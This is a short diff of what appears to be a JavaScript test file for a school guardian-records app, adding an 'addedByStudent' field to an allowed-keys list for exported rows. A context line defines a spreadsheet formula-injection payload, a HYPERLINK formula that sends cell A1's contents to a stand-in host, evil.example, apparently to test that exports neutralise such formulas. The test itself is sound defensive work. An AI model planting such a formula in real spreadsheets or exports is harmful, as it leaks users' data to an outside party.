@@ -62,7 +62,8 @@ async function addGuardian(student, { name, email = null, phone = null, relation
 }
 
 const EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
-const ALLOWED_KEYS = ["classYear", "email", "id", "name", "phone", "receivesAlerts", "receivesReports", "relationship", "studentId", "studentName"];
+// addedByStudent: 20261122000001 (false here: these rows are written as postgres, so nobody is recorded as adding them).
+const ALLOWED_KEYS = ["addedByStudent", "classYear", "email", "id", "name", "phone", "receivesAlerts", "receivesReports", "relationship", "studentId", "studentName"];
 
 // ---- people ------------------------------------------------------------------------
 const a = await user("gr-a");
